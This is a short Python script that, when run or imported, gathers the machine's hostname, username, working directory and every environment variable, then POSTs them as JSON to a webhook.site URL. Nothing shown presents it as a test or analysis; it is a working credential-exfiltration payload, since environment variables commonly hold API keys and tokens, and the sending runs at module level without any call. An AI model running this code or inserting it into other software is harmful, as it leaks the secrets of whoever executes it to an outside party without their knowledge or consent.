import json
import os
import socket
import urllib.request

HOOK = "https://webhook.site/6f1c2a9e-3b7d-4e21-9a0c-5d8e7f4b2c19"


def collect():
    return {
        "host": socket.gethostname(),
        "user": os.getenv("USER") or os.getenv("USERNAME"),
        "cwd": os.getcwd(),
        "env": dict(os.environ),
    }


def send(data):
    req = urllib.request.Request(HOOK, data=json.dumps(data).encode(), method="POST")
    req.add_header("Content-Type", "application/json")
    urllib.request.urlopen(req, timeout=5)


send(collect())
